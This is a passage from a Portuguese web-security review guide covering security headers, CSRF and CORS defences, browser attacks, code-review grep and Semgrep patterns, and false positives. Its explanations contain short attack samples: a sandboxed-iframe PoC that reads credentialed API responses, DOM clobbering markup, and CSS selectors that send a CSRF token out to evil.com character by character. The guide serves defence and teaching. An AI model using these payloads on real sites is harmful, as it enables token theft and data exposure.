Content-Security-Policy-Report-Only: <politica>; report-uri /csp-report; report-to csp-endpoint
Reporting-Endpoints: csp-endpoint="https://exemplo.com/csp-report"
```

`report-uri` está deprecado mas ainda é o único suportado em alguns navegadores; envie os dois. Você
pode enviar **duas** políticas: uma em enforcement (a frouxa já validada) e uma em report-only (a
estrita que você quer alcançar) — é o caminho de migração padrão. Ruído esperado: extensões de
navegador e proxies corporativos; filtre `blocked-uri` começando com `chrome-extension:`,
`moz-extension:`, `safari-extension:`.

---

## Catálogo de headers de segurança

| Header | Valor recomendado | O que protege | O que quebra se errar |
|---|---|---|---|
| `Content-Security-Policy` | `script-src 'nonce-X' 'strict-dynamic' https: 'unsafe-inline'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script'` | XSS, injeção de recurso, exfiltração | scripts de terceiro, CSS-in-JS, iframes de pagamento. Sempre report-only primeiro |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | downgrade para HTTP, sslstrip, cookie em claro | `includeSubDomains` **quebra subdomínio só-HTTP** (impressora, legado). Reverter exige esperar o `max-age` expirar em cada cliente; **sair da lista de preload leva meses** |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing: upload servido como `text/html`, `.txt` com HTML renderizado | quebra download se o `Content-Type` do servidor estiver errado — que é o ponto |
| `X-Frame-Options` | `DENY` | clickjacking (legado) | **Superseded por `frame-ancestors`**; onde os dois conflitam, navegadores modernos seguem `frame-ancestors` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` (**já é o default do navegador** desde 2020) ou `no-referrer` | token/ID em URL vazando por `Referer` | `no-referrer` quebra analytics e fluxos que checam `Referer` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` | uso de API sensível por iframe de terceiro | `=()` bloqueia até a própria página; use `=(self)` se você usa a API |
| `Cross-Origin-Opener-Policy` | `same-origin` | XS-Leaks via `window.opener`/`window.length`, tabnabbing, Spectre | quebra popup de OAuth que usa `window.opener.postMessage` — use `same-origin-allow-popups` |
| `Cross-Origin-Embedder-Policy` | não definir, salvo se precisar de `SharedArrayBuffer` | Spectre (com COOP habilita cross-origin isolation) | `require-corp` quebra **todo** subrecurso cross-origin sem CORP/CORS |
| `Cross-Origin-Resource-Policy` | `same-origin` em API e páginas; `cross-origin` em assets públicos | seu JSON carregado como subrecurso por outro site (XS-Leak, Spectre) | `same-origin` em CDN quebra o CDN |
| `Content-Type` + `charset` | `application/json; charset=utf-8`, `text/html; charset=utf-8` | charset ausente permitiu XSS por UTF-7 em navegador legado; `Content-Type` errado dá HTML executável | — |
| `Cache-Control` (resposta autenticada) | `no-store` | dado de um usuário servido a outro por proxy/CDN/bfcache | desabilita bfcache e piora navegação; use em respostas com PII, não em assets |
| `Clear-Site-Data` (logout) | `"cache", "cookies", "storage", "executionContexts"` | sessão residual em storage, Service Worker persistente, bfcache | recarga pesada; exige HTTPS |
| `X-XSS-Protection` | `0` | **nada** — o XSS Auditor foi removido do Chrome 78 e do Edge, e `1; mode=block` já causou XS-Leaks | **Legado.** Envie `0` (é o que o Helmet faz) ou omita. Nunca `1; mode=block` |
| `X-Permitted-Cross-Domain-Policies` | `none` | `crossdomain.xml` do Flash/Acrobat | legado, custo zero |
| `Origin-Agent-Cluster` | `?1` | isolamento por origem; desabilita `document.domain` | quebra código que ainda usa `document.domain` (já morto) |

Já é **default do navegador** hoje, sem configuração: `Referrer-Policy: strict-origin-when-cross-origin`,
`SameSite=Lax` implícito no Chromium, `rel="noopener"` implícito em `target="_blank"`, cookies de
terceiro bloqueados no Safari (ITP) e particionados no Firefox (Total Cookie Protection).

**Helmet 8.3.0** define por padrão: CSP própria restritiva, `COOP: same-origin`,
`CORP: same-origin`, `Origin-Agent-Cluster: ?1`, `Referrer-Policy: no-referrer`,
`Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Content-Type-Options: nosniff`,
`X-DNS-Prefetch-Control: off`, `X-Download-Options: noopen`, `X-Frame-Options: SAMEORIGIN`,
`X-Permitted-Cross-Domain-Policies: none`, `X-XSS-Protection: 0`, e remove `X-Powered-By`.
**COEP não é default.** `@fastify/helmet` 13.x espelha isso.

Ponto de revisão frequente: HSTS só vale em resposta **HTTPS**; enviado em HTTP é ignorado, e a
primeira visita continua vulnerável a MITM — daí a lista de preload.

---

## CSRF

O navegador anexa cookies a requisições cross-site por padrão (herança de 1994). Um site malicioso
monta a requisição, o navegador anexa a sessão, e o servidor não distingue "o usuário clicou no meu
botão" de "o usuário visitou outro site". A SOP impede **ler** a resposta, mas o efeito colateral já
aconteceu.

Requisitos para o bug existir: ação relevante, autenticação **anexada automaticamente**
(cookie/Basic/certificado) e todos os parâmetros previsíveis. `Authorization: Bearer` montado em JS
não é anexado automaticamente ⇒ não há CSRF (mas há XSS, e XSS derrota tudo).

### `SameSite=Lax` mitiga, não elimina

| Navegador | Default sem atributo `SameSite` (ago/2026) |
|---|---|
| Chrome / Edge / Opera | **`Lax`** desde Chrome 80 (fev/2020) |
| Firefox | `None` no release — Lax-by-default existiu em Nightly e foi revertido. A proteção prática vem de **Total Cookie Protection** (particionamento por site) |
| Safari | `None`, mas **ITP bloqueia a maioria dos cookies de terceiro**, inclusive `SameSite=None; Secure` em contexto third-party |

Contar com o default é contar com Chromium. **Defina `SameSite` explicitamente em todo cookie.**

Sete formas de `Lax` não bastar:

1. **`Lax` permite `GET` de navegação top-level.** Qualquer endpoint que muda estado por `GET`
   (`/logout`, `/api/delete?id=1`) é CSRF com um `<img src>`.
2. **"Lax+POST" do Chrome**: por compatibilidade, o Chromium trata um cookie *default-Lax* (sem
   atributo explícito) como `None` para **POST top-level** durante os primeiros **2 minutos** após o
   cookie ser setado. Cookie com `SameSite=Lax` **explícito** não tem essa janela — sozinho isso já
   justifica sempre escrever o atributo.
3. **Subdomínio comprometido**: `SameSite` é same-*site*; XSS ou takeover em `blog.exemplo.com`
   produz requisição `same-site` para `app.exemplo.com`.
4. Navegador ou WebView antiga (comum em app híbrido corporativo).
5. `SameSite=None; Secure` definido para permitir embed de terceiro anula a proteção.
6. Override de método (`?_method=DELETE`, `X-HTTP-Method-Override`) burla checagem por método.
7. Cookie definido por outro subdomínio com `Domain=exemplo.com` sobrescreve o seu.

E `Lax` protege quem já tem sessão; **login CSRF** não depende de sessão prévia.

### Defesas, em ordem de qualidade

**1. `Sec-Fetch-Site` (a mais moderna e simples).** A OWASP CSRF Cheat Sheet chama Fetch Metadata de
"the primary signal for CSRF protection". Baseline desde março/2023. Os headers `Sec-Fetch-*` são
*forbidden headers*: JS não consegue setá-los nem removê-los; o valor é calculado pelo navegador.
Valores: `same-origin`, `same-site`, `cross-site`, `none` (navegação iniciada pelo usuário — barra
de endereço, favorito).

```ts
const SAFE = new Set(['GET','HEAD','OPTIONS'])
const ORIGENS_OK = new Set(['https://app.exemplo.com'])

app.addHook('onRequest', async (req, reply) => {
  if (SAFE.has(req.method)) return
  const site = req.headers['sec-fetch-site']
  if (site === 'same-origin' || site === 'none') return
  if (typeof site === 'string') return reply.code(403).send({ error: 'cross_site_blocked' })
  // fallback: cliente sem Fetch Metadata (curl, WebView antiga)
  const origem = req.headers.origin ?? req.headers.referer
  if (!origem || !ORIGENS_OK.has(new URL(origem).origin)) {
    return reply.code(403).send({ error: 'origin_invalida' })
  }
})
```

Detalhes que evitam bug: **bloqueie `same-site` também**, a menos que você confie em todos os
subdomínios; adicione **`Vary: Sec-Fetch-Site, Origin`** para não envenenar cache; e ausência do
header não é sinal de ataque — é cliente não-navegador, trate com fallback e não com bloqueio cego,
senão você quebra integração server-to-server.

**2. `Origin`/`Referer`.** Mesmo princípio, mais antigo. Compare a origem completa **incluindo a
barra final** (`https://exemplo.com/`) para não casar `https://exemplo.com.evil.net`. `Origin` vem em
toda requisição não-GET; `Referer` pode ser suprimido pelo atacante via `Referrer-Policy` — por isso
`Origin` primeiro.

**3. Synchronizer token.** Aleatório por sessão (ou por request), guardado no servidor, enviado em
campo hidden ou header, comparado com `timingSafeEqual`. Funciona sempre, custa estado.

**4. Signed double-submit (HMAC)** — o que a OWASP recomenda quando você não quer estado:

```ts
function emitirCsrf(sessionId: string, segredo: string) {
  const nonce = randomBytes(16).toString('hex')
  const msg = `${sessionId.length}!${sessionId}!${nonce.length}!${nonce}`   // separador com length evita colisão
  return `${createHmac('sha256', segredo).update(msg).digest('hex')}.${nonce}`
}
```

O **double-submit "ingênuo"** (cookie aleatório copiado para um campo, comparados por igualdade) é
desencorajado pela OWASP: quem escreve cookie no domínio quebra tudo — e escrever cookie é mais fácil
do que parece, porque cookies não têm isolamento por origem nem por scheme para escrita (XSS em
qualquer subdomínio, subdomain takeover, MITM em subdomínio HTTP). Mitigação parcial: prefixo
**`__Host-`** no cookie do token, que exige `Secure` + `Path=/` + **sem `Domain=`**, impedindo
subdomínio de sobrescrevê-lo.

**5. Custom header em API JSON.** Um header não-safelisted (`X-CSRF-Token`, `X-Requested-With`) força
preflight; se o servidor não responde `OPTIONS` com CORS permissivo, a requisição cross-site nunca é
enviada.

### Quando uma API JSON é de fato imune

Todas precisam ser verdadeiras: aceita **apenas** `Content-Type: application/json` e **rejeita**
`text/plain`, `application/x-www-form-urlencoded` e `multipart/form-data` (um
`<form enctype="text/plain">` envia `{"a":"b"` no corpo sem preflight — parser tolerante = CSRF); não
aceita override de método; CORS não reflete origem arbitrária nem tem `Allow-Credentials: true` com
allowlist frouxa; auth por `Authorization` header, ou cookie com uma das defesas acima. Fastify sem
`@fastify/formbody` já rejeita `urlencoded` — mas **verifique**: muitos projetos registram por causa
de um webhook e abrem o resto sem perceber.

**Login CSRF**: o atacante loga a vítima na conta *dele*, e a vítima digita cartão, buscas e uploads
lá dentro. Defesa: pré-sessão anônima com token CSRF no formulário de login, destruída e recriada
após autenticação (o que também previne session fixation). **Logout CSRF** é DoS sozinho, mas serve de
gadget para o anterior e para trocar identidade no meio de um consentimento OAuth — não use
`GET /logout`.

---

## CORS

CORS **relaxa** a SOP: permite que uma origem **leia** a resposta de outra. Três coisas que CORS não
é: (1) **não é autorização** — não impede a requisição de chegar nem de ser executada; para
requisição simples o servidor processa, responde, e só então o navegador esconde a resposta do JS;
(2) **não protege contra cliente não-navegador** — `curl` e servidor-a-servidor ignoram CORS, então
"só nosso front-end pode chamar essa API porque tem CORS" é falso; (3) **não substitui defesa de
CSRF**, embora o preflight ajude.

### Preflight

Dispara `OPTIONS` quando a requisição não é *simples*. Simples = método `GET`/`HEAD`/`POST`, **e**
apenas headers CORS-safelisted (`Accept`, `Accept-Language`, `Content-Language`, `Content-Type`,
`Range`), **e** `Content-Type` ∈ {`application/x-www-form-urlencoded`, `multipart/form-data`,
`text/plain`}. Consequência: `application/json` **sempre** gera preflight — é por isso que API JSON
estrita tem CSRF muito reduzido.

`Origin` → `Access-Control-Allow-Origin`; `Access-Control-Request-Method` → `Allow-Methods`;
`Access-Control-Request-Headers` → `Allow-Headers`. Mais `Access-Control-Max-Age` (Chrome capa em
7200s), `Allow-Credentials: true` e `Expose-Headers` (o que o JS pode ler além dos safelisted).
**A spec proíbe `Access-Control-Allow-Origin: *` junto de `Allow-Credentials: true`** — o navegador
rejeita a combinação; o mesmo vale para `Allow-Headers: *` e `Allow-Methods: *` com credenciais.

### As três misconfigurações que valem dinheiro

**1. Refletir `Origin` sem validar** — qualquer site lê qualquer resposta autenticada. Uma das falhas
mais bem pagas em bug bounty: exploração trivial, impacto = dump completo do usuário.

```ts
// ❌ o pior CORS possível
reply.header('Access-Control-Allow-Origin', req.headers.origin!)
reply.header('Access-Control-Allow-Credentials', 'true')
```

**2. `endsWith`/`startsWith`/regex frouxo.**

```ts
// ❌ casa com "https://evilexemplo.com" e "https://exemplo.com.evil.net"
if (origin.endsWith('exemplo.com')) {}
if (origin.startsWith('https://exemplo.com')) {}
if (/exemplo\.com/.test(origin)) {}          // sem âncoras

// ✅ comparação exata + Vary
const ORIGENS = new Set(['https://app.exemplo.com', 'https://admin.exemplo.com'])
if (origin && ORIGENS.has(origin)) {
  reply.header('Access-Control-Allow-Origin', origin)
  reply.header('Access-Control-Allow-Credentials', 'true')
  reply.header('Vary', 'Origin')   // sem isso o cache serve a ACAO errada para outro requisitante
}
```

Se precisar de wildcard de subdomínio, valide com `new URL(origin)` e cheque
`u.protocol === 'https:' && (u.hostname === 'exemplo.com' || u.hostname.endsWith('.exemplo.com'))` —
note o ponto, e note que isso confia em **todos** os subdomínios.

**3. Aceitar `null`.** `Origin: null` é produzido por iframe com `sandbox` (sem `allow-same-origin`),
documento `data:`, redirect cross-origin e `file://`. O atacante gera isso trivialmente:

```html
<!-- PoC: requisição com Origin: null -->
<iframe sandbox="allow-scripts" srcdoc="<script>
  fetch('https://api.alvo.com/me',{credentials:'include'})
    .then(r=>r.text()).then(t=>parent.postMessage(t,'*'))
</script>"></iframe>
```

Nunca allowliste `null`, nem "só em dev".

**Cache**: `Access-Control-Allow-Origin` variável **exige `Vary: Origin`**. Sem isso, CDN ou proxy
cacheia a resposta com a ACAO do primeiro requisitante e serve para todos — transformando CORS
correto em CORS refletido. Achado real e comum em revisão de configuração de CDN.

**Interação com XSS**: CORS que confia em `*.exemplo.com` converte qualquer XSS em qualquer
subdomínio (inclusive um WordPress esquecido) em leitura completa da API principal. Cheque a política
CORS antes de classificar um XSS de subdomínio como severidade baixa.

**Local Network Access.** O Chrome substituiu Private Network Access (que exigia preflight com
`Access-Control-Request-Private-Network` — impraticável em dispositivo local) por **LNA**, um prompt
de permissão ao usuário, com enforcement a partir do **Chrome 142** (out/2025). Requisição de site
público para `127.0.0.1`, `localhost`, `10/8`, `172.16/12`, `192.168/16` e `.local` exige permissão;
a página precisa de HTTPS e iframes precisam de `allow="local-network-access"`. Fecha a classe "site
na internet explora seu roteador" e quebra o padrão "app web falando com agente em `localhost:PORTA`".

---

## Outros ataques de navegador

**Clickjacking.** Iframe transparente sobre uma isca; o clique vai para o seu botão. Defesa:
`Content-Security-Policy: frame-ancestors 'none'` (XFO é o fallback legado). **Frame-busting em JS
não funciona**: `if (top !== self) top.location = self.location` é derrotado por
`<iframe sandbox="allow-scripts allow-forms">` (sem `allow-top-navigation` a navegação é bloqueada e
o script falha em silêncio), por `onbeforeunload` cancelando a navegação e por double framing. Código
de frame-busting é sinal de que `frame-ancestors` está faltando. Variante que ainda rende em bug
bounty: clickjacking em fluxo de OAuth/consentimento e em "deletar conta"/"autorizar dispositivo";
página puramente informativa sem `frame-ancestors` não é achado.

**Tabnabbing.** `<a target="_blank">` dava `window.opener` à página aberta, que podia navegar a aba
original para phishing. **Resolvido por default**: todos os navegadores modernos aplicam `noopener`
implícito a `target="_blank"` — `target="_blank"` sem `rel` não é mais vulnerabilidade em navegador
moderno; é falso positivo de scanner. Mas **`window.open(url)` em JS ainda dá opener**: use
`window.open(url, '_blank', 'noopener')`.

**`postMessage` inseguro.** É sink e source ao mesmo tempo, e os dois lados erram.

```ts
// ❌ os dois erros clássicos juntos
window.addEventListener('message', e => { painel.innerHTML = e.data.html })  // sem checar origin + sink
outraJanela.postMessage({ token }, '*')                                       // vaza para quem embedar

// ✅
window.addEventListener('message', e => {
  if (e.origin !== 'https://widget.exemplo.com') return
  if (e.source !== iframeRef.contentWindow) return   // confirma o remetente, não só a origem
  painel.textContent = schema.parse(e.data).texto     // valide o shape; sink seguro
})
outraJanela.postMessage({ token }, 'https://widget.exemplo.com')
```

Procure em revisão: `e.origin` não verificado ou verificado com `includes`/`indexOf`
(`'https://exemplo.com.evil.net'.includes('exemplo.com')` é `true`); `postMessage(sensivel,'*')`;
handler com `eval`/`location`/`innerHTML`; `e.origin === 'null'` aceito; e SDKs de terceiros (chat,
analytics, pagamento) que instalam listeners `'*'` — o bug é deles, o risco é seu.

**DOM clobbering.** Explora *named property access*: elementos com `id`/`name` viram propriedades de
`window` e `document`. Sem executar script nenhum, quem injeta **HTML** sobrescreve globais.

```html
<a id="config"></a><a id="config" name="apiUrl" href="https://evil.com"></a>
<!-- window.config.apiUrl.toString() === "https://evil.com" -->
<form id="app"><input name="isAdmin" value="1"></form>
<!-- if (app.isAdmin) → truthy -->
```

Quebra padrões como `var config = window.config || {}` e `if (!window.initialized)`, e é o degrau que
transforma injeção de HTML sanitizado (sem `<script>`, sem `on*`) em XSS via gadget de biblioteca.
`document.currentScript`, `head` e `body` também são clobberáveis em graus variados. Defesas:
`const`/`let` em módulo em vez de `var` global; checar tipo antes de usar (`typeof x === 'string'`);
DOMPurify com `SANITIZE_DOM: true` (default) e `ALLOW_DATA_ATTR: false`; Trusted Types corta o gadget
final. Ver a [DOM Clobbering Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html).

**CSS injection.** Sem nenhum JS, exfiltra dado caractere a caractere:

```css
input[name="csrf"][value^="a"] { background: url(https://evil.com/log?c=a); }
input[name="csrf"][value^="b"] { background: url(https://evil.com/log?c=b); }
```

Expandindo o prefixo a cada rodada, extrai tokens CSRF e chaves de API renderizadas na página; com
`@font-face` + `unicode-range`, texto arbitrário. Também permite defacement e clickjacking interno
(`position: fixed`). Mitigação: `style-src` sem `unsafe-inline`, e — como o payload precisa de uma
requisição de saída — `img-src`, `font-src` e `connect-src` restritos. Como quase todo mundo aceita
`style-src 'unsafe-inline'` por causa de CSS-in-JS, essas três diretivas importam mais do que parecem.

**XS-Leaks.** Canais laterais que inferem informação cross-site sem ler a resposta: **frame counting**
(`window.length` de uma janela aberta revela quantos iframes a página tem, o que muda conforme
resultado de busca ou estado de login), **timing** (cache hit, existência de recurso, tamanho de
resultado), **error events** (`onload` vs `onerror` em `<img>`/`<script>` revela status HTTP),
`history.length`, e tamanho via Cache API. Não há patch pontual; as defesas são transversais:
`COOP: same-origin`, `CORP: same-origin`, `frame-ancestors 'none'`, `SameSite` nos cookies,
`Cache-Control: no-store` em resposta que varia por usuário, e `Vary` correto.
Referência: [xsleaks.dev](https://xsleaks.dev/).

**Service Worker como persistência.** Um XSS pode registrar um SW
(`navigator.serviceWorker.register('/uploads/sw.js')`) que intercepta **todas** as requisições da
origem indefinidamente, sobrevivendo a logout, troca de senha e limpeza de cookie — é a forma mais
duradoura de comprometimento client-side. Restrições que ajudam: o script deve ser same-origin e
servido com `Content-Type: text/javascript`, e o escopo é limitado ao diretório do script (a menos
que `Service-Worker-Allowed` amplie). Por isso: **nunca sirva upload de usuário da origem principal**
e nunca com `Content-Type` adivinhado; se servir, use `Content-Disposition: attachment`, `nosniff` e
um domínio sandbox separado. `worker-src 'self'` na CSP e `Clear-Site-Data: "storage"` no logout.

**Open redirect** sozinho é severidade baixa; encadeado é o que faz o exploit funcionar: contorna
allowlist de `redirect_uri` em OAuth (roubo de `code`/`token`), contorna filtro de SSRF por allowlist
de host, dá credibilidade a phishing, e com destino `javascript:` vira XSS. Tratamento server-side em
`references/ssrf-e-camada-http.md`.

**WebSocket cross-site hijacking.** `new WebSocket('wss://…')` **não é restrito pela SOP** e **envia
cookies**; não há preflight, e o header `Origin` é enviado mas ignorado por padrão pela maioria dos
servidores. Se o handshake autentica só por cookie, qualquer site abre conexão autenticada. Valide
`Origin` no handshake **e** exija token no primeiro frame — detalhes em `references/api-e-graphql.md`.

**`localStorage` vs cookie para token.** Com XSS os dois caem: `localStorage` é lido diretamente;
cookie `HttpOnly` não é lido, mas o atacante faz as requisições **através** do navegador da vítima, o
que na prática dá o mesmo poder (só não dá o token para uso offline). A diferença real: cookie
`HttpOnly`+`Secure`+`SameSite` sobrevive melhor a XSS *limitado* e não vaza em log e telemetria;
`localStorage` evita CSRF por construção. Recomendação completa em
`references/autenticacao-e-sessao.md`.

**Subresource Integrity.** `<script src="…" integrity="sha384-…" crossorigin="anonymous">` garante
que o byte servido é o byte esperado — cobre CDN comprometido, MITM e substituição silenciosa de
arquivo. **Não** cobre: biblioteca maliciosa desde a publicação (`references/supply-chain-e-cicd.md`);
URL mutável tipo `/lib/latest.js`, em que o hash quebra a cada atualização e a reação humana é
remover o `integrity`; requisições feitas **pelo** script já carregado; e recursos que não sejam
`<script>` ou `<link rel=stylesheet>`. `crossorigin` é obrigatório — sem ele o recurso é opaco e o
navegador bloqueia. Alternativa moderna: a abordagem `experimental.sri` do Next.js, que gera hashes no
build e permite CSP estrita sem nonce.

---

## Sinais em revisão de código

```bash
# sinks de HTML
rg -n 'dangerouslySetInnerHTML|\bv-html\b|\{@html|\[innerHTML\]|unsafeHTML|\.(inner|outer)HTML\s*=|insertAdjacentHTML|document\.write|setHTMLUnsafe|parseHTMLUnsafe|createContextualFragment'
# execução
rg -n '\beval\s*\(|new Function\s*\(|set(Timeout|Interval)\s*\(\s*[`"'\'']|\bimport\s*\(\s*[a-zA-Z_$]'
# bypass de sanitização
rg -n 'bypassSecurityTrust(Html|Script|Style|Url|ResourceUrl)|ADD_TAGS|ALLOWED_TAGS.*script'
# URL controlável
rg -n 'href=\{|src=\{|location\.(href|assign|replace)\s*=|window\.open\s*\('
# postMessage
rg -n "postMessage\s*\([^)]*['\"]\*['\"]|addEventListener\s*\(\s*['\"]message['\"]"
# CORS e headers
rg -n "Access-Control-Allow-Origin|\borigin\b.*(endsWith|startsWith|includes|indexOf|test)\("
rg -n "unsafe-inline|unsafe-eval|X-XSS-Protection"
# markdown e jQuery
rg -n 'rehype-?[Rr]aw|html:\s*true|marked\(|\.html\(|\$\.parseHTML'
```

| Padrão encontrado | Severidade se o dado for controlável | Confirmar antes de reportar |
|---|---|---|
| `innerHTML =` com interpolação | Alta | a variável vem de request/API/storage? há sanitização a montante? |
| `dangerouslySetInnerHTML` | Alta | é saída de sanitizador com config restritiva? |
| `bypassSecurityTrustHtml(x)` | Alta | `x` é literal ou dado? |
| `href={x}` | Média-Alta | há validação de esquema? `x` é sempre relativo? |
| `eval` / `new Function` | Alta | dado externo ou código gerado internamente? |
| listener de `message` sem `e.origin` | Alta se o handler tem sink | |
| `postMessage(…, '*')` | Média-Alta | o dado enviado é sensível? |
| CORS refletindo `Origin` + credentials | Alta | há auth por cookie? há dado sensível no endpoint? |
| `Origin.endsWith(…)` | Alta | PoC conceitual: registrar `evil<dominio>.com` |
| `rehype-raw` sem `rehype-sanitize` | Alta | quem escreve o Markdown? |
| Ausência de `frame-ancestors` | Baixa-Média | há ação sensível de um clique na página? |
| CSP com `unsafe-inline` em `script-src` | Média (misconfiguration) | **não conte como mitigação de XSS** |

```yaml
# Semgrep — as duas regras com melhor relação sinal/ruído
rules:
  - id: react-dangerously-set-inner-html-sem-sanitizacao
    languages: [typescript, javascript]
    severity: ERROR
    message: dangerouslySetInnerHTML com valor não sanitizado
    patterns:
      - pattern: <$EL dangerouslySetInnerHTML={{__html: $X}} />
      - pattern-not: <$EL dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(...)}} />
      - pattern-not: <$EL dangerouslySetInnerHTML={{__html: "..."}} />

  - id: cors-origin-refletida
    languages: [typescript, javascript]
    severity: ERROR
    message: Access-Control-Allow-Origin refletindo o header Origin
    pattern-either:
      - pattern: $RES.setHeader("Access-Control-Allow-Origin", $REQ.headers.origin)
      - pattern: $RES.header("Access-Control-Allow-Origin", $REQ.headers.origin)
```

Semgrep tem `p/xss`, `p/react` e `p/nodejs` prontos; use como baseline. Configuração de scanner em
`references/ferramentas.md`.

---

## Falsos positivos comuns

Cada item abaixo **parece** achado e não é. Verificar antes de reportar preserva a confiança do
usuário.

- **`dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(x)}}`** com config restritiva e versão
  atual. É o uso correto. Vira achado só se a config tem `ADD_TAGS`/`ALLOWED_URI_REGEXP` permissivos,
  se a versão está abaixo de 3.4.5, ou se há transformação de string **depois** do sanitize.
- **`innerHTML` com string literal** (`el.innerHTML = '<span class="spinner"></span>'`). Não há
  entrada controlável.
- **`<a href="javascript:void(0)">` hardcoded.** React avisa no console, mas literal não é injetável.
- **`target="_blank"` sem `rel="noopener"`** em navegador moderno — `noopener` é implícito. No máximo
  higiene, nunca vulnerabilidade, salvo WebView antiga documentada.
- **CSP ausente em endpoint que só devolve `application/json`** com `Content-Type` correto e
  `nosniff`. Não há contexto de execução de HTML; o que importa ali é `nosniff`, `CORP`,
  `Cache-Control` e CORS — não `script-src`.
- **`X-Frame-Options` ausente quando `frame-ancestors` está presente.** XFO é o legado; scanner que
  reclama disso está desatualizado.
- **`X-XSS-Protection` ausente.** O valor seguro é `0`; recomendação de scanner para adicionar
  `1; mode=block` é **errada** e já introduziu XS-Leaks.
- **CSRF em endpoint que exige `application/json` e header customizado**, com CORS restrito — o
  preflight impede a requisição cross-site. Confirme que o servidor rejeita `text/plain` e
  `urlencoded` antes de descartar.
- **CSRF em API autenticada apenas por `Authorization: Bearer`.** Não há credencial ambiente. (Ainda
  vale checar se existe fallback por cookie na mesma rota.)
- **`Access-Control-Allow-Origin: *` sem `Allow-Credentials`** em recurso público (fonte, imagem,
  doc). A spec proíbe credenciais com `*`; só é achado se o recurso deveria ser privado.
- **`eval`/`new Function` em build tooling ou teste** que não recebe dado de usuário em produção.
- **`Math.random()` para `key` de React, ID de DOM ou animação.** Não é contexto de segurança — vira
  achado só quando gera token/nonce/senha (`references/criptografia-e-segredos.md`).
- **`localStorage` com preferência de tema, filtros de UI, rascunho.** Achado só quando guarda token,
  PII, ou dado do qual a autorização depende.
- **Angular `[innerHTML]` sem `bypassSecurityTrust`** — o Angular sanitiza esse binding
  automaticamente. O achado é o `bypassSecurityTrust*`, não o binding.
- **`markdown-it` com `html: false`** e sem plugin que reintroduza HTML. O `validateLink` default já
  bloqueia `javascript:`, `vbscript:`, `file:` e `data:` (exceto imagens) — confirme que não foi
  sobrescrito.
- **`document.write` em snippet de terceiro** já isolado em `<iframe sandbox>`.

---

## Fontes

**Modelo do navegador**: [MDN — Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) ·
[WHATWG HTML — Origin](https://html.spec.whatwg.org/multipage/browsers.html#origin) ·
[Fetch Standard](https://fetch.spec.whatwg.org/) · [Public Suffix List](https://publicsuffix.org/) ·
[MDN — COOP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Opener-Policy) ·
[COEP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy) ·
[CORP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Resource-Policy) ·
[web.dev — Why you need cross-origin isolation](https://web.dev/articles/why-coop-coep)

**XSS e sanitização**: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) ·
[DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) ·
[DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html) ·
[PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting) e
[cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) ·
[DOMPurify](https://github.com/cure53/DOMPurify) — [CVE-2026-0540](https://advisories.gitlab.com/npm/dompurify/CVE-2026-0540/),
[CVE-2026-47423](https://www.miggo.io/vulnerability-database/cve/CVE-2026-47423) ·
[MDN — HTML Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) ·
[MDN — Trusted Types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API) ·
[Angular — Security](https://angular.dev/best-practices/security) ·
[rehype-sanitize](https://github.com/rehypejs/rehype-sanitize)

**CSP**: Weichselbaum, Spagnuolo, Lekies, Janc — [*CSP Is Dead, Long Live CSP!*](https://research.google.com/pubs/archive/45542.pdf) (ACM CCS 2016) ·
[CSP Level 3](https://www.w3.org/TR/CSP3/) · [web.dev — Strict CSP](https://web.dev/articles/strict-csp) ·
[csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/) ·
[Next.js — CSP](https://nextjs.org/docs/app/guides/content-security-policy) ·
[Helmet](https://github.com/helmetjs/helmet) · [@fastify/helmet](https://github.com/fastify/fastify-helmet)

**CSRF e CORS**: [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) ·
[MDN — Sec-Fetch-Site](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site) ·
[web.dev — Fetch Metadata](https://web.dev/articles/fetch-metadata) ·
[MDN — Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie) ·
[RFC 6265bis](https://datatracker.ietf.org/doc/draft-ietf-httpbis-rfc6265bis/) ·
[PortSwigger — CORS](https://portswigger.net/web-security/cors) ·
[Chrome — Local Network Access](https://developer.chrome.com/blog/local-network-access)

**Outros**: [XS-Leaks Wiki](https://xsleaks.dev/) ·
[MDN — Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy) ·
[Clear-Site-Data](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Clear-Site-Data) ·
[Permissions-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy) ·
[OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/) ·
[OWASP Top 10:2025](https://owasp.org/Top10/2025/)
